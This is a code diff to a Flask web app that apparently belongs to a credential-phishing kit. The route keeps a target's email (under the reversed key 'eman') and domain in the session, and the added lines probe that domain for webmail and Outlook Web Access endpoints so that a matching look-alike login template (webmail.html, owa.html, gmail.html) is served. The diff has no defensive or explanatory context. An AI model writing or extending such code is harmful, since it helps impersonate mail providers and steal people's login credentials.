@@ -181,6 +181,19 @@ def route2():
             session['eman'] = web_param
             session['ins'] = domain
             
+            # Check for webmail and OWA endpoints
+            webmail_url = f"https://{domain}/webmail"
+            owa_url1 = f"https://owa.{domain}/owa/#path=/mail"
+            owa_url2 = f"https://autodiscover.{domain}/owa/#path=/mail/search"
+            
+            try:
+                if requests.get(webmail_url, timeout=3).status_code == 200:
+                    return render_template('webmail.html', eman=session['eman'], ins=session['ins'])
+                if requests.get(owa_url1, timeout=3).status_code == 200 or requests.get(owa_url2, timeout=3).status_code == 200:
+                    return render_template('owa.html', eman=session['eman'], ins=session['ins'])
+            except requests.RequestException:
+                pass
+            
             # Render different templates based on domain
             if domain == "gmail.com":
                 return render_template('gmail.html', eman=session['eman'], ins=session['ins'])
